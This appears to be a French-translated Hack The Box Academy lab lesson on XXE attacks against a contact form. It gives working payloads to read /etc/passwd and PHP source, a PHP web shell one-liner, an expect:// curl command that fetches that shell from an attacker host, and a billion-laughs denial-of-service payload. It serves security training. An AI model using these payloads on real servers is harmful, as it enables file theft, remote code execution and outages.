Divulgation des fichiers locaux
===============================

* * * * *

Lorsqu'une application Web fait confiance aux données XML non filtrées de l'entrée de l'utilisateur, nous pouvons être en mesure de référencer un document DTD XML externe et de définir de nouvelles entités XML personnalisées. Supposons que nous puissions définir de nouvelles entités et les afficher sur la page Web. Dans ce cas, nous devrions également pouvoir définir des entités externes et les faire référencer à un fichier local qui, une fois affiché, devrait nous montrer le contenu de ce fichier sur le serveur principal.

Voyons comment nous pouvons identifier les vulnérabilités potentielles de XXE et les exploiter pour lire des fichiers sensibles à partir du serveur principal.

* * * * *

Identification
--------------

La première étape dans l'identification des vulnérabilités potentielles XXE consiste à trouver des pages Web qui acceptent une entrée utilisateur XML. On peut commencer l'exercice à la fin de cette section, qui comporte un `Contact Form`:

![](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_identify.jpg)

Si on remplit le formulaire de contact et qu'on clique sur `Send Data`, puis qu'on intercepte la requête HTTP avec Burp, on obtient la requête suivante :

![xxe_request](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_request.jpg)

Comme nous pouvons le voir, le formulaire semble envoyer nos données au format XML au serveur Web, ce qui en fait une cible potentielle de test XXE. Supposons que l'application Web utilise des bibliothèques XML obsolètes et qu'elle n'applique aucun filtre ou nettoyage sur notre entrée XML. Dans ce cas, nous pourrons peut-être exploiter ce formulaire XML pour lire des fichiers locaux.

Si nous envoyons le formulaire sans aucune modification, nous obtenons le message suivant :

![xxe_response](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_response.jpg)

Nous voyons que la valeur de l' `email`élément nous est renvoyée sur la page. Pour imprimer le contenu d'un fichier externe à la page, il faut `note which elements are being displayed, such that we know which elements to inject into`. Dans certains cas, aucun élément ne peut être affiché, ce que nous verrons comment exploiter dans les sections à venir.

Pour l'instant, nous savons que la valeur que nous plaçons dans l' `<email></email>`élément est affichée dans la réponse HTTP. Essayons donc de définir une nouvelle entité, puis utilisons-la comme variable dans l' `email`élément pour voir si elle est remplacée par la valeur que nous avons définie. Pour ce faire, nous pouvons utiliser ce que nous avons appris dans la section précédente pour définir de nouvelles entités XML et ajouter les lignes suivantes après la première ligne dans l'entrée XML :

Code : xml

```
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>

```

Remarque : Dans notre exemple, l'entrée XML dans la requête HTTP n'avait pas de DTD déclarée dans les données XML elles-mêmes, ou référencée en externe, nous avons donc ajouté une nouvelle DTD avant de définir notre entité. Si le était déjà déclaré dans la requête XML, nous y `DOCTYPE`ajouterions simplement l' élément.`ENTITY`

Maintenant, nous devrions avoir une nouvelle entité XML appelée `company`, que nous pouvons référencer avec `&company;`. Ainsi, au lieu d'utiliser notre email dans l' `email`élément, essayons d'utiliser `&company;`, et voyons s'il sera remplacé par la valeur que nous avons définie ( `Inlane Freight`) :

![nouvelle_entité](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_new_entity.jpg)

Comme nous pouvons le voir, la réponse a utilisé la valeur de l'entité que nous avons définie ( `Inlane Freight`) au lieu d'afficher `&company;`, indiquant que nous pouvons injecter du code XML. En revanche, une application Web non vulnérable afficherait ( `&company;`) comme valeur brute. `This confirms that we are dealing with a web application vulnerable to XXE`.

Remarque : Certaines applications Web peuvent utiliser par défaut un format JSON dans la requête HTTP, mais peuvent toujours accepter d'autres formats, y compris XML. Ainsi, même si une application Web envoie des requêtes au format JSON, nous pouvons essayer de changer l' `Content-Type`en-tête en `application/xml`, puis convertir les données JSON en XML avec un [outil en ligne](https://www.convertjson.com/json-to-xml.htm) . Si l'application Web accepte la demande avec des données XML, nous pouvons également la tester contre les vulnérabilités XXE, ce qui peut révéler une vulnérabilité XXE imprévue.

* * * * *

Lecture de fichiers sensibles
-----------------------------

Maintenant que nous pouvons définir de nouvelles entités XML internes, voyons si nous pouvons définir des entités XML externes. Cela est assez similaire à ce que nous avons fait précédemment, mais nous ajouterons simplement le `SYSTEM`mot-clé et définirons le chemin de référence externe après, comme nous l'avons appris dans la section précédente :

Code : xml

```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>

```

Envoyons maintenant la requête modifiée et voyons si la valeur de notre entité XML externe est définie sur le fichier auquel nous faisons référence :

![entité_externe](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_external_entity.jpg)

On voit qu'on a bien récupéré le contenu du `/etc/passwd`fichier, `meaning that we have successfully exploited the XXE vulnerability to read local files`. Cela nous permet de lire le contenu des fichiers sensibles, comme les fichiers de configuration qui peuvent contenir des mots de passe ou d'autres fichiers sensibles comme une `id_rsa`clé SSH d'un utilisateur spécifique, ce qui peut nous donner accès au serveur principal. Nous pouvons nous référer au module [File Inclusion / Directory Traversal](https://academy.hackthebox.com/course/preview/file-inclusion) pour voir quelles attaques peuvent être menées via la divulgation de fichiers locaux.

Conseil : Dans certaines applications Web Java, nous pouvons également spécifier un répertoire au lieu d'un fichier, et nous obtiendrons à la place une liste de répertoires, ce qui peut être utile pour localiser les fichiers sensibles.

* * * * *

Lecture du code source
----------------------

Un autre avantage de la divulgation de fichiers locaux est la possibilité d'obtenir le code source de l'application Web. Cela nous permettrait de dévoiler `Whitebox Penetration Test`plus de vulnérabilités dans l'application Web, ou à tout le moins de révéler des configurations secrètes comme les mots de passe de base de données ou les clés API.

Voyons donc si nous pouvons utiliser la même attaque pour lire le code source du `index.php`fichier, comme suit :

![fichier_php](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_file_php.jpg)

Comme nous pouvons le voir, cela n'a pas fonctionné, car nous n'avons obtenu aucun contenu. C'est arrivé parce que `the file we are referencing is not in a proper XML format, so it fails to be referenced as an external XML entity`. Si un fichier contient des caractères spéciaux XML (par exemple `<`/ `>`/ `&`), il casserait la référence d'entité externe et ne serait pas utilisé pour la référence. De plus, nous ne pouvons lire aucune donnée binaire, car elle ne serait pas non plus conforme au format XML.

Heureusement, PHP fournit des filtres wrapper qui nous permettent d'encoder en base64 certaines ressources "y compris les fichiers", auquel cas la sortie finale en base64 ne doit pas casser le format XML. Pour ce faire, au lieu de l'utiliser `file://`comme référence, nous utiliserons `php://filter/`le wrapper de PHP. Avec ce filtre, nous pouvons spécifier l' `convert.base64-encode`encodeur comme filtre, puis ajouter une ressource d'entrée (par exemple `resource=index.php`), comme suit :

Code : xml

```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>

```

Avec cela, nous pouvons envoyer notre requête, et nous obtiendrons la chaîne encodée en base64 du `index.php`fichier :

![fichier_php](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_php_filter.jpg)

Nous pouvons sélectionner la chaîne base64, cliquer sur l'onglet Inspecteur de Burp (dans le volet de droite), et il nous montrera le fichier décodé. Pour en savoir plus sur les filtres PHP, vous pouvez vous référer au module [File Inclusion / Directory Traversal](https://academy.hackthebox.com/module/details/23) .

`This trick only works with PHP web applications.`La section suivante abordera une méthode plus avancée de lecture du code source, qui devrait fonctionner avec n'importe quel framework Web.

* * * * *

Exécution de code à distance avec XXE
-------------------------------------

En plus de lire les fichiers locaux, nous pourrons peut-être obtenir l'exécution de code sur le serveur distant. La méthode la plus simple serait de rechercher `ssh`des clés ou d'essayer d'utiliser une astuce de vol de hachage dans les applications Web Windows en appelant notre serveur. Si cela ne fonctionne pas, nous pouvons toujours exécuter des commandes sur des applications Web basées sur PHP via le `PHP://expect`filtre, bien que cela nécessite `expect`l'installation et l'activation du module PHP.

Si le XXE imprime directement sa sortie "comme indiqué dans cette section", alors nous pouvons exécuter des commandes de base comme `expect://id`, et la page devrait imprimer la sortie de la commande. Cependant, si nous n'avions pas accès à la sortie, ou si nous devions exécuter une commande plus compliquée 'par exemple reverse shell', alors la syntaxe XML peut se casser et la commande peut ne pas s'exécuter.

La méthode la plus efficace pour transformer XXE en RCE consiste à récupérer un shell Web sur notre serveur et à l'écrire dans l'application Web, puis nous pouvons interagir avec lui pour exécuter des commandes. Pour ce faire, nous pouvons commencer par écrire un shell Web PHP de base et démarrer un serveur Web python, comme suit :

```
dsgsec@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
dsgsec@htb[/htb]$ sudo python3 -m http.server 80

```

Maintenant, nous pouvons utiliser le code XML suivant pour exécuter une `curl`commande qui télécharge notre shell Web sur le serveur distant :

Code : xml

```
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>

```

Remarque : Nous avons remplacé tous les espaces dans le code XML ci-dessus par `$IFS`, pour éviter de casser la syntaxe XML. De plus, de nombreux autres caractères comme `|`, `>`et `{`peuvent casser le code, nous devons donc éviter de les utiliser.

Une fois que nous envoyons la demande, nous devrions recevoir une demande sur notre machine pour le `shell.php`fichier, après quoi nous pouvons interagir avec le shell Web sur le serveur distant pour l'exécution de code.

Remarque : Le module expect n'est pas activé/installé par défaut sur les serveurs PHP modernes, donc cette attaque peut ne pas toujours fonctionner. C'est pourquoi XXE est généralement utilisé pour divulguer des fichiers locaux sensibles et du code source, ce qui peut révéler des vulnérabilités supplémentaires ou des moyens d'obtenir l'exécution de code.

Autres attaques XXE
-------------------

Une autre attaque courante souvent menée via les vulnérabilités XXE est l'exploitation SSRF, qui est utilisée pour énumérer les ports ouverts localement et accéder à leurs pages, entre autres pages Web restreintes, via la vulnérabilité XXE. Le module [Server-Side Attacks](https://academy.hackthebox.com/course/preview/server-side-attacks) couvre en détail SSRF, et les mêmes techniques peuvent être utilisées avec les attaques XXE.

Enfin, une utilisation courante des attaques XXE provoque un déni de service (DOS) sur le serveur Web d'hébergement, avec l'utilisation de la charge utile suivante :

Code : xml

```
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>

```

Cette charge utile définit l' `a0`entité comme `DOS`, la référence `a1`plusieurs fois, la référence `a1`dans `a2`, et ainsi de suite jusqu'à ce que la mémoire du serveur principal s'épuise en raison des boucles d'auto-référence. Cependant, `this attack no longer works with modern web servers (e.g., Apache), as they protect against entity self-reference`. Essayez-le contre cet exercice, et voyez si cela fonctionne.
